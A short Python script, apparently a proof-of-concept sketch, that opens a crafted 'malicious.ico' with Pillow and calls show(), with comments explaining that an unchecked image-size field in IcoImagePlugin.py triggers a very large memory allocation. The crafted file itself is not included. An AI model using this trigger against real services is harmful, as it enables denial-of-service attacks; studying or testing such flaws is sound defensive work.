# Import the Pillow library
from PIL import Image

# Open a malicious ICO image file
# This file has a large number of contained images
# This will trigger the vulnerability in the IcoImagePlugin.py module
# The open function will not properly check the reported size of each image
# This will result in an attempted memory allocation that can be very large
img = Image.open("malicious.ico")

# Try to display the image
# This will also trigger the vulnerability
img.show()